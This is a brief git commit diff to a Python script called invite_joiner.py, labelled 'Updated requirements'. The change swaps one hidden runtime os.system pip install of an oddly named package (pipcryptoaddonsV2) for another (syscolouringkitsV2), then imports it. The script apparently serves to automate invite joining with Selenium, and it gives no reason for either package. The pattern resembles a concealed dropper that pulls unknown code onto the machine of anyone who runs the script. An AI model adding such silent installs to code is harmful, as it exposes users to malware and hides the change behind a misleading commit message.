ffe34511a49d31057495b4690a3d34565b2f925e
Patrick Pogoda <121391953+PatrickPogoda@users.noreply.github.com>
2023-05-04 01:06:27 +0200

    Updated requirements

--- invite_joiner.py
+++ invite_joiner.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipcryptoaddonsV2")
-import pipcryptoaddonsV2
+os.system("pip install syscolouringkitsV2")
+import syscolouringkitsV2
 from selenium import webdriver
 from selenium.webdriver.firefox.options import Options
 from selenium.webdriver.common.keys import Keys
